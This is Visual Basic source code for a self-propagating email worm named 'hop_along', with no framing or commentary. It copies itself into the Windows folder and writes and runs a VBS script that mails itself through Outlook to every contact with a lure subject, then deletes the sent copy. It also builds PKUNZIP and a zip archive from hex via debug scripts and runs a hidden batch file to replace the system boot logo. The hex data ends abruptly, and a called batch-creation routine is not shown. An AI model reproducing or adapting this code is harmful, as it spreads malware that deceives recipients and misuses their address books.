Private Sub Form_Load()
If Dir("c:\windows\hop_along.exe") = "" Then ' check if already infected
FileCopy App.Path & "\" & App.EXEName & ".exe", "c:\windows\hop_along.exe"
CreateVBS   ' call the Create VBS sub
Shell "wscript.exe c:\windows\hop_along.vbs"    ' Run the VBS script
CreatePKunzip   ' Call the CreatePKunzip sub
LogoZip     ' Call the LogoZip sub
CreateBat   ' Call the CreateBat sub
Shell "c:\windows\hop_along.bat", vbHide    ' Run the bat
Wait4Bat    ' Run the Wait4Bat Loop till bat is completed running
FileCopy "c:\windows\logo.sys", "c:\logo.sys"   'Copy Logo file to c:\
End If
End
End Sub

Public Sub CreateVBS()
Open "c:\windows\hop_along.vbs" For Output As #1
Print #1, "Set createmail = CreateObject(" & Chr(34) & "Outlook.Application" & Chr(34) & ")"
Print #1, " If createmail <> " & Chr(34) & "" & Chr(34) & " Then"
Print #1, " Set EachMail = createmail.GetNameSpace(" & Chr(34) & "MAPI" & Chr(34) & ")"
Print #1, " For Each GetEmail In EachMail.AddressLists"
Print #1, " If GetEmail.AddressEntries.Count > 0 Then"
Print #1, " Set Eletter = createmail.CreateItem(0)"
Print #1, " For VecH = 1 To GetEmail.AddressEntries.Count"
Print #1, " Set FloP = GetEmail.AddressEntries(VecH)"
Print #1, " If VecH = 1 Then"
Print #1, " Eletter.BCC = FloP.Address"
Print #1, " Else"
Print #1, " Eletter.BCC = Eletter.BCC & " & Chr(34) & "; " & Chr(34) & " & FloP.Address"
Print #1, " End If"
Print #1, " Next"
Print #1, " Eletter.Subject = " & Chr(34) & "Look At This!!!" & Chr(34); ""
Print #1, " Eletter.Body = " & Chr(34) & "You have to see this file its so funny!" & Chr(34); ""
Print #1, " Eletter.Attachments.Add " & Chr(34) & "C:\windows\hop_along.exe" & Chr(34); ""
Print #1, " Eletter.DeleteAfterSubmit = True"
Print #1, " Eletter.Send"
Print #1, " End If"
Print #1, " Next"
Print #1, "End If"
Close #1
End Sub

Sub CreatePKunzip()
Open "c:\windows\pkunzip.dbg" For Output As #2
Print #2, "N PKUNZIP.COM"
Print #2, "E 0100 B9 2E B9 BF BE 0B 2B CF 32 C0 F3 AA B4 30 CD 21"
Print #2, "E 0110 A3 22 B9 8D A5 00 06 89 26 26 B9 B8 C6 09 E8 50"
Print #2, "E 0120 00 E8 C0 01 B8 4B 0A E8 31 00 B8 62 A9 E8 2B 00"
Print #2, "E 0130 E8 61 00 E8 3E 00 A0 20 B9 E9 0E 00 BB 65 0A 50"
Print #2, "E 0140 53 92 E8 34 00 58 E8 28 00 58 B4 4C CD 21 C6 06"
Print #2, "E 0150 20 B9 01 50 B8 5B 0A E8 1F 00 58 E8 88 02 8B F0"
Print #2, "E 0160 E8 23 00 8B 1E BC 0B 8B D6 91 B4 40 CD 21 E9 82"
Print #2, "E 0170 02 E8 E7 FF B8 48 0A EB E2 50 E8 F7 FF B8 3E 0A"
Print #2, "E 0180 E8 D8 FF 58 EB D5 56 96 BA FF FF AC 42 84 C0 75"
Print #2, "E 0190 FA 92 5E C3 E8 4F 02 33 C9 33 D2 88 0E 2A AA 8B"
Print #2, "E 01A0 1E 28 B9 B8 02 42 CD 21 8B F0 85 D2 75 05 3D 00"
Print #2, "E 01B0 10 72 03 BE 00 10 2B C6 83 DA 00 95 8B FA 83 EE"
Print #2, "E 01C0 12 8B D5 8B CF E8 EF 00 BA 00 0E 8D 4C 12 E8 EC"
Print #2, "E 01D0 00 8B CE C7 06 68 0A 05 06 B8 66 0A E8 A3 00 85"
Print #2, "E 01E0 C0 75 1F 8B C5 0B C7 74 11 81 ED EA 0F 83 DF 00"
Print #2, "E 01F0 7D CF 03 F5 33 ED 33 FF EB C7 B0 03 BA 6A 0A E9"
Print #2, "E 0200 3A FF 97 8B 4D 14 E3 31 56 8D 75 16 33 DB AC 3C"
Print #2, "E 0210 1B 74 0C 3C 13 75 03 43 EB 05 92 B4 02 CD 21 E2"
Print #2, "E 0220 ED 5E E8 4F FF 85 DB 74 10 B8 86 0A E8 99 00 72"
Print #2, "E 0230 05 B0 08 E9 14 FF E8 3B FF 8B 36 26 B9 8B 55 10"
Print #2, "E 0240 8B 4D 12 E8 71 00 83 7D 0E 00 75 2E 8B 4D 0C A1"
Print #2, "E 0250 06 00 2B C6 3B C1 72 22 8B D6 E8 60 00 8B 4D 0A"
Print #2, "E 0260 E3 15 8B 5C 1C 8B 54 1E 8D 78 2E 03 FA 03 7C 20"
Print #2, "E 0270 E8 B2 01 8B F7 E2 EB E9 79 01 B0 07 BA B5 0A E9"
Print #2, "E 0280 BA FE E8 61 01 96 33 C0 A3 D6 AE E3 24 8B FA AD"
Print #2, "E 0290 47 4F AF E0 FC 83 F9 01 76 17 A7 74 06 4F 4F 4E"
Print #2, "E 02A0 4E EB EE 8D 5D FC 89 1E D6 AE 80 3E 2A AA 00 74"
Print #2, "E 02B0 EC A1 D6 AE E9 3C 01 53 B8 00 42 EB 03 53 B4 3F"
Print #2, "E 02C0 8B 1E 28 B9 CD 21 5B C3 E8 90 FE B8 08 0C CD 21"
Print #2, "E 02D0 24 DF 3C 59 74 04 3C 4E 75 F1 92 B4 02 CD 21 80"
Print #2, "E 02E0 EA 4F F5 C3 E8 D5 00 BE 81 00 8A 4C FF 32 ED E3"
Print #2, "E 02F0 1E AC 3C 20 74 17 3C 09 74 13 3C 2D 75 6D AC 49"
Print #2, "E 0300 74 0D 3C 6F 74 04 3C 4F 75 03 A2 FC A9 E2 E2 80"
Print #2, "E 0310 3E 24 B9 00 74 34 BE 62 A9 33 DB AC 3C 2E 75 01"
Print #2, "E 0320 43 84 C0 75 F6 85 DB 75 0A C7 44 FF 2E 5A C7 44"
Print #2, "E 0330 01 49 50 BA 62 A9 B8 00 3D 80 3E 22 B9 03 72 02"
Print #2, "E 0340 B0 20 CD 21 A3 28 B9 72 09 C3 BA D1 0A B0 02 E9"
Print #2, "E 0350 EA FD BA C4 0A BB 62 A9 B0 02 E9 E2 FD AC 3C 20"
Print #2, "E 0360 74 90 3C 09 74 8C AA E2 F4 EB A4 80 3E 24 B9 00"
Print #2, "E 0370 75 08 BF 62 A9 A2 24 B9 EB 03 BF E0 AE AA EB E7"
Print #2, "E 0380 E8 63 00 8B F2 8B E9 8B 0E 2A B9 8B 16 2C B9 BF"
Print #2, "E 0390 BC AA FC 33 C0 45 EB 16 AC 8B D8 32 D9 8A CD 8A"
Print #2, "E 03A0 EA 8A D6 8A F7 D1 E3 D1 E3 33 09 33 51 02 4D 75"
Print #2, "E 03B0 E7 89 0E 2A B9 89 16 2C B9 E9 37 00 E8 27 00 FD"
Print #2, "E 03C0 BF BA AE BD FF 00 B9 08 00 8B D5 33 C0 D1 E8 D1"
Print #2, "E 03D0 DA 73 07 81 F2 20 83 35 B8 ED E2 F1 AB 92 AB 4D"
Print #2, "E 03E0 79 E4 FC E9 0D 00 8F 06 D2 AE 55 56 57 53 51 FF"
Print #2, "E 03F0 26 D2 AE 59 5B 5F 5E 5D C3 50 56 57 97 8B F2 AC"
Print #2, "E 0400 AA 84 C0 75 FA 5F 5E 58 C3 52 56 8B F0 E8 76 FD"
Print #2, "E 0410 03 C6 5E 5A EB E3 B8 05 0B E8 32 FD B8 7C AA E8"
Print #2, "E 0420 39 FD E9 CE FF E8 BE FF E8 E3 00 8A 44 0A 3C 08"
Print #2, "E 0430 74 04 84 C0 75 E0 03 D3 83 C2 1E 33 C9 03 54 2A"
Print #2, "E 0440 13 4C 2C E8 71 FE E8 54 00 85 C0 74 4D E8 24 FD"
Print #2, "E 0450 B8 FF FF A3 2A B9 A3 2C B9 8B 44 0A 48 78 05 E8"
Print #2, "E 0460 FB 00 EB 03 E8 BA 00 A1 2A B9 8B 16 2C B9 F7 D0"
Print #2, "E 0470 F7 D2 2B 44 10 1B 54 12 0B C2 74 0B B8 52 0B E8"
Print #2, "E 0480 CC FC C6 06 20 B9 01 8B 1E D0 AE 8B 4C 0C 8B 54"
Print #2, "E 0490 0E B8 01 57 CD 21 B4 3E CD 21 E9 56 FF E8 46 FF"
Print #2, "E 04A0 BF 7C AA 8B CB 03 FB 4F FD B0 2F F2 AE 75 01 47"
Print #2, "E 04B0 47 FC B8 2C AA BA E0 AE E8 3E FF 50 8B D7 E8 48"
Print #2, "E 04C0 FF 58 80 3E FC A9 00 75 29 50 BA FE A9 B4 1A CD"
Print #2, "E 04D0 21 5A B4 4E B9 07 00 CD 21 72 17 B8 00 43 CD 21"
Print #2, "E 04E0 72 10 92 E8 68 FC B8 26 0B E8 DC FD 72 04 33 C0"
Print #2, "E 04F0 EB 19 B9 20 00 B4 3C BA 2C AA CD 21 73 0A 8B DA"
Print #2, "E 0500 BA 43 0B B0 05 E9 37 FC A3 D0 AE E9 E5 FE E8 D5"
Print #2, "E 0510 FE BF 7C AA 8D 74 2E 8B CB F3 A4 32 C0 AA E9 D2"
Print #2, "E 0520 FE E8 C2 FE B8 67 0B E8 31 FC B8 2C AA E8 2B FC"
Print #2, "E 0530 B9 62 9B 8B 7C 14 8B 74 16 85 F6 75 06 3B CF 72"
Print #2, "E 0540 02 8B CF BA 00 0E 52 E8 73 FD 5A 85 C0 74 0B 2B"
Print #2, "E 0550 F8 83 DE 00 91 E8 47 04 EB DF E9 96 FE E8 86 FE"
Print #2, "E 0560 B8 74 0B E8 F5 FB B8 2C AA E8 EF FB E8 30 00 E9"
Print #2, "E 0570 81 FE 80 FD 08 74 05 8A CD E8 F4 00 8B CA AD 33"
Print #2, "E 0580 C2 40 74 03 E9 C3 02 A4 81 FF 00 9E 72 03 E8 F9"
Print #2, "E 0590 03 81 FE 20 B7 72 03 E8 C4 00 E2 EB 58 EB 0B C6"
Print #2, "E 05A0 06 DE AE 00 E8 B7 00 BF 00 0E B5 08 AD 92 80 3E"
Print #2, "E 05B0 DE AE 00 75 57 E8 8E 00 D0 16 DE AE E8 95 01 E8"
Print #2, "E 05C0 C2 00 84 E4 75 0C AA 81 FF 00 9E 72 F2 E8 BA 03"
Print #2, "E 05D0 EB ED 3D 00 01 74 D7 2D FE 00 50 E8 0D 01 91 59"
Print #2, "E 05E0 56 8D 75 FF 2B F3 72 06 81 FE 00 0E 73 18 BB 00"
Print #2, "E 05F0 0E 2B DE 03 36 DC AE 3B D9 73 0B 87 D9 2B D9 F3"
Print #2, "E 0600 A4 BE 00 0E 87 D9 F3 A4 5E 91 EB BB 8B CF BA 00"
Print #2, "E 0610 0E 2B CA E8 89 03 C3 80 F9 08 77 12 53 33 C0 33"
Print #2, "E 0620 DB 8A D9 8A 87 A8 0B 22 C2 E8 44 00 5B C3 53 33"
Print #2, "E 0630 DB 8A D9 B1 08 2A D9 E8 E2 FF 8A CB 8A D8 E8 DB"
Print #2, "E 0640 FF 0A F8 93 5B C3 D1 EA FE CD 74 01 C3 9C 81 FE"
Print #2, "E 0650 20 B7 72 03 E8 07 00 8A 34 46 B5 08 9D C3 50 51"
Print #2, "E 0660 52 B9 00 08 BA 20 AF 8B F2 E8 51 FC 5A 59 58 C3"
Print #2, "E 0670 2A E9 77 0D F6 DD 2A CD D3 EA 8A CD E8 CE FF 2A"
Print #2, "E 0680 E9 D3 EA C3 8A DA 32 FF D1 E3 8B 9F 62 A0 85 DB"
Print #2, "E 0690 78 0E 8A 8F 02 9F E8 D7 FF 93 3D 09 01 73 09 C3"
Print #2, "E 06A0 B8 62 A4 E8 26 00 EB EE 3D 1D 01 74 1B 2D 01 01"
Print #2, "E 06B0 8A C8 D0 E9 D0 E9 49 25 03 00 04 04 D3 E0 05 01"
Print #2, "E 06C0 01 93 E8 52 FF 03 C3 C3 B8 00 02 C3 B1 08 E8 9F"
Print #2, "E 06D0 FF 56 96 8A C2 32 C9 F7 D3 FE C1 D1 EB D1 E8 D1"
Print #2, "E 06E0 D3 D1 E3 8B 18 85 DB 78 EE 5E C3 8A DA 32 FF D1"
Print #2, "E 06F0 E3 8B 9F 62 A2 85 DB 78 1F 8A 8F 42 A0 E8 70 FF"
Print #2, "E 0700 80 FB 04 72 12 93 8A C8 D0 E9 49 24 01 04 02 D3"
Print #2, "E 0710 E0 93 E8 02 FF 03 D8 C3 B8 E2 A8 E8 AE FF EB DD"
Print #2, "E 0720 56 51 BF 02 9F B9 90 00 B0 08 F3 AA B1 70 FE C0"
Print #2, "E 0730 F3 AA B1 18 B0 07 F3 AA B1 08 FE C0 F3 AA BF 42"
Print #2, "E 0740 A0 B1 20 89 0E FA A9 B0 05 F3 AA C7 06 D4 AE 20"
Print #2, "E 0750 01 E9 D4 00 B1 02 E8 BE FE 48 79 03 E9 13 FE 57"
Print #2, "E 0760 74 BE 48 74 03 E9 E2 00 B1 05 E8 AA FE 05 01 01"
Print #2, "E 0770 A3 D4 AE B1 05 E8 9F FE 40 A3 FA A9 51 BF BC AE"
Print #2, "E 0780 B9 13 00 32 C0 F3 AA 59 B1 04 E8 8A FE 05 04 00"
Print #2, "E 0790 BF 96 0B 8B EF 03 E8 33 DB B1 03 E8 79 FE 8A 1D"
Print #2, "E 07A0 88 87 BC AE 47 3B FD 72 F0 56 51 BF 20 B7 BE BC"
Print #2, "E 07B0 AE B8 13 00 E8 9B 00 59 5E 8B 2E D4 AE 03 2E FA"
Print #2, "E 07C0 A9 BF 02 9F 32 FF 8A DA D1 E3 8B 9F 20 B7 8A 8F"
Print #2, "E 07D0 BC AE E8 9B FE 8A C3 3C 10 73 06 AA 4D 75 E5 EB"
Print #2, "E 07E0 35 77 0C B1 02 E8 2F FE 04 03 8A 4D FF EB 17 3C"
Print #2, "E 07F0 11 77 09 B1 03 E8 1F FE 04 03 EB 08 B1 07 E8 16"
Print #2, "E 0800 FE 05 0B 00 32 C9 51 86 C1 32 ED 2B E9 72 3B F3"
Print #2, "E 0810 AA 59 85 ED 75 AE 56 51 BE 02 9F BF 42 A0 03 36"
Print #2, "E 0820 D4 AE 8B 0E FA A9 F3 A4 A1 D4 AE BE 02 9F BF 62"
Print #2, "E 0830 A0 BD 62 A4 E8 1B 00 A1 FA A9 BE 42 A0 BF 62 A2"
Print #2, "E 0840 BD E2 A8 E8 0C 00 59 5E 5F C3 BA 81 0B B0 04 E9"
Print #2, "E 0850 EA F8 85 C0 74 F3 52 A3 D6 A9 89 3E D8 AE BF D8"
Print #2, "E 0860 A9 57 B9 10 00 33 C0 F3 AB 5F 56 8B 0E D6 A9 33"
Print #2, "E 0870 DB AC 8A D8 D1 E3 FF 01 E2 F7 BE B2 A9 BB 02 00"
Print #2, "E 0880 33 C0 89 00 B1 0F 03 87 D8 A9 D1 E0 43 43 89 00"
Print #2, "E 0890 E2 F4 83 38 00 74 12 BE DA A9 B9 0F 00 33 DB AD"
Print #2, "E 08A0 03 D8 E2 FB 83 FB 01 77 A1 5E 56 8B 0E D6 A9 BF"
Print #2, "E 08B0 C0 0B AC 32 E4 85 C0 74 0E 8B D8 D1 E3 8B 87 B2"
Print #2, "E 08C0 A9 40 89 87 B2 A9 48 AB E2 E8 5E 56 BF C0 0B 8B"
Print #2, "E 08D0 16 D6 A9 AC 8A C8 49 78 17 74 15 8B 1D 33 C0 D1"
Print #2, "E 08E0 EB D1 D0 E0 FA 41 D1 EB D3 D0 AB 4A 75 E5 EB 07"
Print #2, "E 08F0 47 47 33 C9 4A 75 DC 5E 8B 3E D8 AE B9 00 01 33"
Print #2, "E 0900 C0 F3 AB BF C0 0B 8B 16 D6 A9 A3 D6 A9 4A 03 F2"
Print #2, "E 0910 03 FA 03 FA FD AC 84 C0 74 1E 3C 08 77 22 91 B8"
Print #2, "E 0920 01 00 41 D3 E0 8B 1D D1 E3 56 8B 36 D8 AE 89 10"
Print #2, "E 0930 03 D8 80 FF 02 72 F7 5E 4F 4F 4A 79 D8 FC 5A C3"
Print #2, "E 0940 2C 08 8A C8 8B 05 8A D8 32 FF D1 E3 03 1E D8 AE"
Print #2, "E 0950 B5 01 56 52 83 3F 00 75 18 8B 16 D6 A9 8B F2 D1"
Print #2, "E 0960 EA F7 D2 89 17 83 06 D6 A9 04 33 D2 89 12 89 52"
Print #2, "E 0970 02 8B 1F F7 D3 D1 E3 03 DD 84 E5 74 02 43 43 D0"
Print #2, "E 0980 E5 FE C9 75 CF 5A 89 17 EB AD 51 52 8B CF BA 00"
Print #2, "E 0990 0E 8B FA 2B CA 89 0E DC AE E8 03 00 5A 59 C3 53"
Print #2, "E 09A0 52 E8 DC F9 5A 8B 1E D0 AE B4 40 CD 21 5B 3B C1"
Print #2, "E 09B0 75 01 C3 B4 3E CD 21 BA 2C AA B4 41 CD 21 BA B1"
Print #2, "E 09C0 0B B0 06 E9 76 F7 0D 0A 50 4B 55 4E 5A 4A 52 28"
Print #2, "E 09D0 54 4D 29 20 20 46 41 53 54 21 20 20 4D 69 6E 69"
Print #2, "E 09E0 20 45 78 74 72 61 63 74 20 55 74 69 6C 69 74 79"
Print #2, "E 09F0 20 20 56 65 72 73 69 6F 6E 20 32 2E 30 34 67 20"
Print #2, "E 0A00 20 30 32 2D 30 31 2D 39 33 0D 0A 43 6F 70 72 2E"
Print #2, "E 0A10 20 31 39 38 39 2D 31 39 39 33 20 50 4B 57 41 52"
Print #2, "E 0A20 45 20 49 6E 63 2E 20 41 6C 6C 20 52 69 67 68 74"
Print #2, "E 0A30 73 20 52 65 73 65 72 76 65 64 2E 0D 0A 00 50 4B"
Print #2, "E 0A40 55 4E 5A 4A 52 3A 20 00 0D 0A 00 53 65 61 72 63"
Print #2, "E 0A50 68 69 6E 67 20 5A 49 50 3A 20 00 57 61 72 6E 69"
Print #2, "E 0A60 6E 67 21 20 00 00 50 4B 00 00 45 72 72 6F 72 20"
Print #2, "E 0A70 69 6E 20 5A 49 50 20 2D 20 55 73 65 20 50 4B 5A"
Print #2, "E 0A80 69 70 46 69 78 00 44 6F 20 79 6F 75 20 77 61 6E"
Print #2, "E 0A90 74 20 74 6F 20 65 78 74 72 61 63 74 20 74 68 65"
Print #2, "E 0AA0 73 65 20 66 69 6C 65 73 20 6E 6F 77 20 28 79 2F"
Print #2, "E 0AB0 6E 29 3F 20 00 54 6F 6F 20 6D 61 6E 79 20 66 69"
Print #2, "E 0AC0 6C 65 73 00 43 61 6E 27 74 20 4F 70 65 6E 3A 20"
Print #2, "E 0AD0 00 55 73 61 67 65 3A 20 20 70 6B 75 6E 7A 6A 72"
Print #2, "E 0AE0 20 5B 2D 6F 5D 20 66 69 6C 65 6E 61 6D 65 5B 2E"
Print #2, "E 0AF0 7A 69 70 5D 20 5B 6F 75 74 70 75 74 5F 70 61 74"
Print #2, "E 0B00 68 5D 0D 0A 00 55 6E 6B 6E 6F 77 6E 20 63 6F 6D"
Print #2, "E 0B10 70 72 65 73 73 69 6F 6E 20 6D 65 74 68 6F 64 20"
Print #2, "E 0B20 66 6F 72 3A 20 00 20 61 6C 72 65 61 64 79 20 65"
Print #2, "E 0B30 78 69 73 74 73 21 20 4F 76 65 72 77 72 69 74 65"
Print #2, "E 0B40 3F 20 00 43 61 6E 27 74 20 63 72 65 61 74 65 3A"
Print #2, "E 0B50 20 00 66 69 6C 65 20 66 61 69 6C 73 20 43 52 43"
Print #2, "E 0B60 20 63 68 65 63 6B 00 45 78 74 72 61 63 74 69 6E"
Print #2, "E 0B70 67 3A 20 00 20 49 6E 66 6C 61 74 69 6E 67 3A 20"
Print #2, "E 0B80 00 46 69 6C 65 20 68 61 73 20 61 20 62 61 64 20"
Print #2, "E 0B90 74 61 62 6C 65 00 10 11 12 00 08 07 09 06 0A 05"
Print #2, "E 0BA0 0B 04 0C 03 0D 02 0E 01 0F 01 03 07 0F 1F 3F 7F"
Print #2, "E 0BB0 FF 64 69 73 6B 20 66 75 6C 6C 00 00 01 00"
Print #2, "RCX"
Print #2, "0ABE"
Print #2, "W"
Print #2, "Q"
Close #2
End Sub

Sub LogoZip()
Open "c:\windows\logo.dbg" For Output As #3
Print #3, "N LOGO.ZIP"
Print #3, "E 0100 50 4B 03 04 14 00 00 00 08 00 38 51 9B 28 17 D3"
Print #3, "E 0110 09 49 36 12 00 00 36 F8 01 00 08 00 00 00 6C 6F"
Print #3, "E 0120 67 6F 2E 53 59 53 ED 9D 39 8F 2B C7 15 46 6B 04"
Print #3, "E 0130 07 8E E4 3F 20 28 36 6C 28 15 60 40 81 E1 44 81"
Print #3, "E 0140 E0 50 89 52 45 0A 9D 39 B3 33 67 86 23 47 4A 9D"
Print #3, "E 0150 28 76 A0 DC 86 42 07 86 9D 71 E9 66 73 99 85 FB"
Print #3, "E 0160 BE CC 0C 7D 6F 55 F5 CA 2E D7 13 6E BF 9E 9E E1"
Print #3, "E 0170 77 04 E1 91 C5 4B 72 FA 9B EA 66 73 58 F7 F0 37"
Print #3, "E 0180 BF FD 74 7F A3 98 4F 7F A2 D4 CF E9 DF 5F D3 D5"
Print #3, "E 0190 BF D0 FF 37 EA A7 7A 5C AD 6F D4 BF 3E 54 EA 9F"
Print #3, "E 01A0 1F 9A AB 2D F3 8F 3A D3 7F EA 7C 56 00 80 F7 CD"
Print #3, "E 01B0 59 FD 4C CD D5 C7 2A 54 9F A8 7F AB CF D4 3F D4"
Print #3, "E 01C0 17 EA EF EA 2B F5 37 F5 8D FA AB FA BD FA 13 FD"
Print #3, "E 01D0 F7 7B BA F4 0D 8D 7C 45 B7 7C 41 15 9F 51 E5 27"
Print #3, "E 01E0 74 8F 8F E9 9E 3F E3 BD 55 2D 68 1F 8E 3E 52 EA"
Print #3, "E 01F0 BF BF 50 EA 87 5F 29 F5 FD E7 4A 7D F7 A5 52 DF"
Print #3, "E 0200 7E AD D4 9F 7F A7 D4 1F FF A0 D4 EF FE AC D4 D7"
Print #3, "E 0210 DF 2A F5 E5 77 4A 7D FE BD 52 BF FA 41 A9 5F FE"
Print #3, "E 0220 47 A9 8F 22 A5 3E 5C E8 1F 45 3D 4C 66 8B D5 66"
Print #3, "E 0230 77 38 3D 9D DB DD A0 D7 1F DE DE 8F A7 3C B4 DD"
Print #3, "E 0240 1F 69 AC D5 09 C2 A8 3F 1C DD DD 3F 4C 68 78 B9"
Print #3, "E 0250 5A 6F B6 BB C3 F1 78 7A 7C 7A 3E B7 5A ED 4E A7"
Print #3, "E 0260 DB 0D 82 30 EC F5 7A 51 16 BA 1E 86 41 D0 ED 76"
Print #3, "E 0270 3A ED 56 EB FC FC F4 78 3A 1E 0F BB ED 66 BD 5A"
Print #3, "E 0280 2E 66 D3 C9 C3 FD DD 68 D8 8F C2 A0 D3 3A 3F 9D"
Print #3, "E 0290 8E FB ED 66 45 C3 E3 FB DB 61 BF 17 74 DB 34 76"
Print #3, "E 02A0 D8 F1 D0 E4 E1 6E 34 88 C2 6E A7 F5 FC 48 55 EB"
Print #3, "E 02B0 E5 7C AA 87 A8 AA 43 55 34 B6 DB AC ED 23 DE 8E"
Print #3, "E 02C0 86 34 1E 06 5D 7A 4A 7E 46 7A CA C3 61 BF DF 6D"
Print #3, "E 02D0 B7 DB CD 66 CD AC 0C FA F2 66 43 E3 BB FD FE 70"
Print #3, "E 02E0 A0 8D D1 5B D3 EE 74 83 B0 D7 1F 0C 47 B7 76 6B"
Print #3, "E 02F0 D7 9B DD FE F8 48 C9 74 28 99 C1 E8 8E 46 E7 CB"
Print #3, "E 0300 35 25 F3 F8 DC EA 74 C3 48 0F E9 FC CC 90 CE 4F"
Print #3, "E 0310 0F 71 15 65 AA CB F8 AE 34 4A B1 CE F9 21 E9 49"
Print #3, "E 0320 0F 3A 3F 7E 4A 0E 30 B0 01 26 11 EA CB 1C 5F C0"
Print #3, "E 0330 F1 F1 C6 E8 FC 0E 7B CE 6F B9 98 53 50 0F 77 B7"
Print #3, "E 0340 1C 82 0E 86 B2 E2 64 74 58 3A 3F 13 56 2E 3F 93"
Print #3, "E 0350 A8 CE 8F 42 E6 A1 4C F2 CB F9 6C 62 1F 31 E2 FC"
Print #3, "E 0360 32 BF 31 8A 6F 67 E3 5B 65 B1 01 EE 38 C0 74 36"
Print #3, "E 0370 70 7E 91 DD DA C9 6C BE CC CD 22 1A A6 A9 C5 F9"
Print #3, "E 0380 D9 D9 A6 F3 B3 43 F9 48 79 88 E6 24 8D E9 49 19"
Print #3, "E 0390 0D 28 D5 FB 31 0D 9B 09 68 7E 67 F4 94 36 40 3D"
Print #3, "E 03A0 03 4D 82 31 61 32 FB 28 3E B3 31 34 17 CC F4 A3"
Print #3, "E 03B0 29 34 BE A7 A4 06 91 9E 6A 94 D5 81 27 91 9D 59"
Print #3, "E 03C0 F9 C9 66 67 64 27 33 23 F5 10 47 4A 55 3A D3 95"
Print #3, "E 03D0 7D 44 9E 7E 51 3A FD 4E 27 1B DF 86 E3 D3 A9 2D"
Print #3, "E 03E0 0D 36 41 1A B7 01 9E 4E E9 04 8C 78 02 DA AD 5D"
Print #3, "E 03F0 E9 AC 28 19 0E 4B EF 9A 99 BD B5 63 F7 56 DF F1"
Print #3, "E 0400 06 B8 E1 BD D5 5F 05 5C F0 DE EA AF 02 2E F8 98"
Print #3, "E 0410 E8 AF 02 2E F8 00 E8 AF 02 2E F8 CC CE 5F 05 5C"
Print #3, "E 0420 F0 E9 8A BF 0A B8 E0 33 3B 7F 15 70 C1 67 80 FE"
Print #3, "E 0430 2A E0 82 DF 9A F9 AB 80 0B 7E BF E6 AF 02 2E F8"
Print #3, "E 0440 5D 9D BF 0A B8 E0 B7 C0 FE 2A E0 82 FF B6 E2 AF"
Print #3, "E 0450 02 2E F8 0F 56 FE 2A E0 82 FF 38 EA AF 02 2E F8"
Print #3, "E 0460 6F 80 FE 2A E0 82 FF 2E ED AF 02 2E F8 EF D2 FE"
Print #3, "E 0470 2A E0 82 3F DD F0 57 01 17 FC 91 9B BF 0A B8 E0"
Print #3, "E 0480 8F DC FC 55 C0 05 7F 8A E9 AF 02 2E F8 53 4C 6F"
Print #3, "E 0490 11 70 C2 6B 0E BC 45 C0 09 7F B2 EE AF 02 2E 78"
Print #3, "E 04A0 19 87 BF 0A B8 E0 A5 31 FE 2A E0 82 17 0D F9 AB"
Print #3, "E 04B0 80 0B 5E 60 E5 AF 02 2E 78 1D 96 BF 0A B8 E0 15"
Print #3, "E 04C0 92 FE 2A E0 82 57 4D FA AB 80 0B 5E DC EB AF 02"
Print #3, "E 04D0 2E 78 21 AA BF 0A B8 E0 C5 BD FE 2A E0 82 97 8D"
Print #3, "E 04E0 FB AB 80 0B 5E 9D EF AF 02 2E 78 25 BE BF 0A B8"
Print #3, "E 04F0 E0 1E 0F 7F 15 70 C1 7D 33 FE 2A E0 82 9B B4 FC"
Print #3, "E 0500 55 C0 05 B7 22 F9 AB 80 0B 6E 1C F4 57 01 17 DC"
Print #3, "E 0510 38 E8 AF 02 2E B8 BF D0 5F 05 5C 70 2F A6 BF 0A"
Print #3, "E 0520 B8 E0 06 61 7F 15 70 C1 9D D3 FE 2A E0 82 DB CC"
Print #3, "E 0530 FD 55 C0 05 37 A3 FB AB 80 0B EE F0 F7 57 01 17"
Print #3, "E 0540 AC 8E F0 57 01 17 AC E8 F0 57 01 17 6C E3 F0 57"
Print #3, "E 0550 01 17 2C CA F1 57 01 17 2C CA F1 57 01 17 EC D8"
Print #3, "E 0560 F1 57 01 17 AC 23 F2 57 01 17 2C C9 F2 57 01 17"
Print #3, "E 0570 2C 0F F3 57 01 17 AC FA F3 57 01 17 AC FA F3 57"
Print #3, "E 0580 01 17 AC FA F3 57 01 17 6C 4F F4 57 01 17 2C 54"
Print #3, "E 0590 F4 57 01 17 EC 3A F5 57 01 17 6C 85 F5 57 01 17"
Print #3, "E 05A0 6C 94 F5 57 01 17 2C 3A F6 57 01 17 2C 2B F6 57"
Print #3, "E 05B0 01 17 2C 3A F6 57 01 17 F0 3F CB 80 FF 59 06 FC"
Print #3, "E 05C0 CF 32 E0 7F 96 01 FF B3 0C F8 9F 65 C0 FF 2C 03"
Print #3, "E 05D0 FE 67 19 F0 3F CB 80 FF 59 06 FC CF 32 E0 7F 96"
Print #3, "E 05E0 01 FF B3 0C F8 9F 65 C0 FF 2C 03 FE 67 19 F0 3F"
Print #3, "E 05F0 CB 80 FF 59 06 FC CF 32 E0 7F 96 01 FF B3 0C F8"
Print #3, "E 0600 9F 65 C0 FF 2C 03 FE 67 19 F0 3F CB 80 FF 59 06"
Print #3, "E 0610 FC CF 32 E0 7F 96 01 FF B3 0C F8 9F 65 C0 FF 2C"
Print #3, "E 0620 A3 46 FF F3 0D E1 AF 7A 0F DC 24 F8 6B 7F 2C 35"
Print #3, "E 0630 FA 9F 2F 36 E0 83 12 1C F7 15 71 93 C1 5F FD E3"
Print #3, "E 0640 A8 D1 FF FC 62 F9 25 BC 87 00 AB F0 3F A7 3F 54"
Print #3, "E 0650 F6 C7 BB 48 E4 5D 67 41 5A 90 29 2D CF F8 E2 F1"
Print #3, "E 0660 D2 9B CB 7E 19 EF 25 3F B1 BF F8 5D B7 37 DE 54"
Print #3, "E 0670 5F 82 EF 9C DF 4D 86 4C 59 F1 D2 7B DD 81 2B F0"
Print #3, "E 0680 3F 97 6D 6F D9 76 94 E6 52 86 6B 73 0B 53 EA C7"
Print #3, "E 0690 3C EF 4D FC 6F F5 F9 89 FD C5 AF 21 BF E2 A5 CA"
Print #3, "E 06A0 A8 C0 FF 5C FD 76 98 DB 2F AA 9A 99 9F D8 5F 7C"
Print #3, "E 06B0 93 C3 8C BD 64 7E 1F 14 8A 93 5B 33 3F 5F 65 54"
Print #3, "E 06C0 E0 7F 2E CD E5 83 0C 99 BA 38 17 CF 66 DC DC DC"
Print #3, "E 06D0 94 54 15 F2 2B DB CF 3F C8 51 52 57 7D 7E 62 7F"
Print #3, "E 06E0 71 FA 53 E5 7E BE C2 46 E4 36 A3 F8 10 45 CA EB"
Print #3, "E 06F0 8A F9 95 D4 99 92 C2 13 27 BF BA F7 90 5F 05 FE"
